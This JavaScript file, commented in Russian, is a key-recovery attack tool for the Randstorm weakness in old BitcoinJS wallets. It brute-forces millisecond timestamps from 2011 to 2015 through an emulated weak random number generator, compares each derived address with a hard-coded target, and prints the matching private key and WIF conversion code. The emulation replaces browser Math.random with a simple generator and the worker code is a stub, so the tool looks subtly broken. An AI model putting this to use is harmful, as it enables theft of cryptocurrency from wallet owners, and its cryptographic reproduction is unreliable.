// randstorm-precise-search.js
const crypto = require('crypto');
const secp256k1 = require('secp256k1');

// 1. Эмуляция уязвимого ГПСЧ BitcoinJS
class Rand {
    constructor(seedTime) {
        this.SEED_TIME_VALUE = seedTime;
        this.pool = new Array(256);
        this.pptr = 0;
        this.state = null;
        // Используем детерминированный Math.random для точного воспроизведения
        this.detRandom = this.createDeterministicRandom();
        this.initPool();
    }

    // Детерминированный Math.random на основе seedTime
    createDeterministicRandom() {
        let seed = this.SEED_TIME_VALUE;
        return function() {
            seed = (seed * 9301 + 49297) % 233280;
            return seed / 233280;
        };
    }

    initPool() {
        for (let i = 0; i < 256; i++) {
            let t = Math.floor(65536 * this.detRandom());
            this.pool[this.pptr++] = t >>> 8;
            this.pool[this.pptr++] = t & 255;
        }
        this.pptr = 0;
        this.seedTime();
    }

    seedTime() {
        let x = this.SEED_TIME_VALUE;
        for (let i = 0; i < 4; i++) {
            this.pool[this.pptr++] ^= (x >> (i * 8)) & 255;
            if (this.pptr >= 256) this.pptr = 0;
        }
    }

    getByte() {
        if (!this.state) {
            this.state = this.arcFour();
            this.state.init(this.pool);
        }
        return this.state.next();
    }

    arcFour() {
        return {
            init: function(key) {
                this.S = Array.from({length: 256}, (_, i) => i);
                this.i = 0;
                this.j = 0;
                
                for (let i = 0; i < 256; i++) {
                    this.j = (this.j + this.S[i] + key[i]) & 255;
                    [this.S[i], this.S[this.j]] = [this.S[this.j], this.S[i]];
                }
            },
            next: function() {
                this.i = (this.i + 1) & 255;
                this.j = (this.j + this.S[this.i]) & 255;
                [this.S[this.i], this.S[this.j]] = [this.S[this.j], this.S[this.i]];
                return this.S[(this.S[this.i] + this.S[this.j]) & 255];
            }
        };
    }

    nextBytes(bytes) {
        for (let i = 0; i < bytes.length; i++) bytes[i] = this.getByte();
    }
}

// 2. Оптимизированная генерация адреса
function generateWalletFromSeedTime(seedTime) {
    const rng = new Rand(seedTime);
    const privateKeyBytes = new Uint8Array(32);
    
    // Генерация и проверка приватного ключа
    let privateKey;
    do {
        rng.nextBytes(privateKeyBytes);
        privateKey = Buffer.from(privateKeyBytes);
    } while (!secp256k1.privateKeyVerify(privateKey));

    // Публичный ключ (сжатый)
    const publicKey = secp256k1.publicKeyCreate(privateKey, true);
    
    // Хэширование SHA256 + RIPEMD160
    const sha256 = crypto.createHash('sha256').update(publicKey).digest();
    const ripemd160 = crypto.createHash('ripemd160').update(sha256).digest();
    
    // Base58Check кодирование
    const address = generateBitcoinAddress(ripemd160);
    
    return {
        privateKey: privateKey.toString('hex'),
        address: address,
        seedTime: seedTime
    };
}

// 3. Генерация Bitcoin адреса
function generateBitcoinAddress(hash) {
    const version = Buffer.from([0x00]);
    const payload = Buffer.concat([version, hash]);
    
    const checksum = crypto.createHash('sha256')
        .update(crypto.createHash('sha256').update(payload).digest())
        .digest()
        .slice(0, 4);
    
    const addressBytes = Buffer.concat([payload, checksum]);
    return base58Encode(addressBytes);
}

// 4. Оптимизированное Base58 кодирование
const base58Alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58Encode(buffer) {
    let bigInt = 0n;
    for (let i = 0; i < buffer.length; i++) {
        bigInt = bigInt * 256n + BigInt(buffer[i]);
    }
    
    let result = '';
    while (bigInt > 0n) {
        const remainder = Number(bigInt % 58n);
        result = base58Alphabet[remainder] + result;
        bigInt = bigInt / 58n;
    }
    
    // Ведущие нули
    for (let i = 0; i < buffer.length && buffer[i] === 0; i++) {
        result = base58Alphabet[0] + result;
    }
    
    return result;
}

// 5. Основная функция поиска с миллисекундной точностью
async function preciseSearch(targetAddress, options = {}) {
    const {
        startTime = new Date('2011-01-01').getTime(),
        endTime = new Date('2015-12-31').getTime(),
        batchSize = 1000, // Размер пакета для вывода прогресса
        progressInterval = 10000 // Интервал вывода прогресса
    } = options;

    console.log('🔍 Точный поиск адреса с шагом 1 мс');
    console.log(`Целевой адрес: ${targetAddress}`);
    console.log(`Диапазон: ${new Date(startTime).toISOString()} - ${new Date(endTime).toISOString()}`);
    console.log(`Всего итераций: ${(endTime - startTime + 1).toLocaleString()}`);
    console.log('─'.repeat(50));

    const totalIterations = endTime - startTime + 1;
    let found = null;
    let current = 0;
    let lastProgressTime = Date.now();

    // Кэш для частей адреса для быстрой проверки
    const addressPrefix = targetAddress.substring(0, 8);
    
    for (let seedTime = startTime; seedTime <= endTime && !found; seedTime++) {
        current++;
        
        // Вывод прогресса
        if (current % progressInterval === 0) {
            const now = Date.now();
            const elapsed = (now - lastProgressTime) / 1000;
            const speed = progressInterval / elapsed;
            const percent = ((current / totalIterations) * 100).toFixed(6);
            
            console.log(
                `Прогресс: ${percent}% | ` +
                `Скорость: ${speed.toFixed(0)} итераций/сек | ` +
                `Время: ${new Date(seedTime).toISOString()}`
            );
            
            lastProgressTime = now;
        }
        
        const wallet = generateWalletFromSeedTime(seedTime);
        
        // Быстрая проверка по префиксу
        if (wallet.address.startsWith(addressPrefix) && wallet.address === targetAddress) {
            found = wallet;
            break;
        }
        
        // Обработка пакетов
        if (current % batchSize === 0) {
            // Освобождаем память
            if (global.gc) global.gc();
        }
    }

    return found;
}

// 6. Функция для сужения диапазона поиска
async function narrowSearch(targetAddress, approximateDate) {
    console.log('🎯 Сужение диапазона поиска...');
    
    // Создаем окно поиска вокруг предполагаемой даты
    const windowMs = 7 * 24 * 60 * 60 * 1000; // ±1 неделя
    const startTime = approximateDate.getTime() - windowMs;
    const endTime = approximateDate.getTime() + windowMs;
    
    console.log(`Окно поиска: ${new Date(startTime).toISOString()} - ${new Date(endTime).toISOString()}`);
    console.log(`Ширина окна: ${windowMs * 2} мс (${(windowMs * 2 / 1000).toLocaleString()} секунд)`);
    
    return await preciseSearch(targetAddress, {
        startTime,
        endTime,
        batchSize: 10000,
        progressInterval: 1000
    });
}

// 7. Основная функция
async function main() {
    //const targetAddress = '    Ваш     Bitcoin       Адрес';
    const targetAddress = '1Hky8kD5D4Pbk2mUziUnYkeVZBZFXA5PRW';
    
    // Вариант 1: Полный поиск (очень долго!)
    const result = await preciseSearch(targetAddress);
    
    // Вариант 2: Поиск в ограниченном диапазоне
    // Пример: предполагаем, что кошелек создан в середине 2013
    //const approximateDate = new Date('2013-07-01T12:00:00Z');
    //const result = await narrowSearch(targetAddress, approximateDate);
    
    // Вариант 3: Поиск по конкретному дню
    // const dayStart = new Date('2011-01-01').getTime();
    // const dayEnd = new Date('2015-12-31').getTime();
    // const result = await preciseSearch(targetAddress, {
    //     startTime: dayStart,
    //    endTime: dayEnd
    // });
    
    console.log('\n' + '═'.repeat(50));
    
    if (result) {
        console.log('✅ АДРЕС НАЙДЕН!');
        console.log('═'.repeat(50));
        console.log(`Время создания: ${new Date(result.seedTime).toISOString()}`);
        console.log(`Unix timestamp: ${result.seedTime}`);
        console.log(`Приватный ключ (HEX): ${result.privateKey}`);
        console.log(`Адрес: ${result.address}`);
        console.log('═'.repeat(50));
        
        // Конвертация в WIF формат
        console.log('\n🔐 WIF форматы:');
        console.log('Используйте следующий код для конвертации:');
        console.log(`
const wif = require('wif');
const privateKey = Buffer.from('${result.privateKey}', 'hex');
// Несжатый WIF
const wifUncompressed = wif.encode(128, privateKey, false);
// Сжатый WIF
const wifCompressed = wif.encode(128, privateKey, true);
console.log('WIF несжатый:', wifUncompressed);
console.log('WIF сжатый:', wifCompressed);
        `);
    } else {
        console.log('❌ Адрес не найден в указанном диапазоне.');
        console.log('\n💡 Рекомендации:');
        console.log('1. Расширьте диапазон поиска');
        console.log('2. Убедитесь в правильности адреса');
        console.log('3. Используйте многопоточный поиск');
    }
}

// 8. Вспомогательные функции для многопоточности (если нужно)
function createWorkerScript() {
    return `
        const { parentPort, workerData } = require('worker_threads');
        const crypto = require('crypto');
        const secp256k1 = require('secp256k1');
        
        // ... (копия функций generateWalletFromSeedTime, base58Encode и т.д.)
        
        const { startTime, endTime, targetAddress } = workerData;
        
        for (let seedTime = startTime; seedTime <= endTime; seedTime++) {
            const wallet = generateWalletFromSeedTime(seedTime);
            if (wallet.address === targetAddress) {
                parentPort.postMessage({ found: true, wallet });
                return;
            }
        }
        
        parentPort.postMessage({ found: false });
    `;
}

// Запуск
if (require.main === module) {
    console.log('🔧 Установите зависимости: npm install secp256k1');
    console.log('🚀 Запуск точного поиска Bitcoin адреса...\n');
    
    // Проверка наличия зависимостей
    try {
        require.resolve('secp256k1');
        main().catch(console.error);
    } catch (e) {
        console.error('❌ Ошибка: Установите зависимости командой: npm install secp256k1');
        process.exit(1);
    }
}

module.exports = {
    Rand,
    generateWalletFromSeedTime,
    preciseSearch,
    narrowSearch
};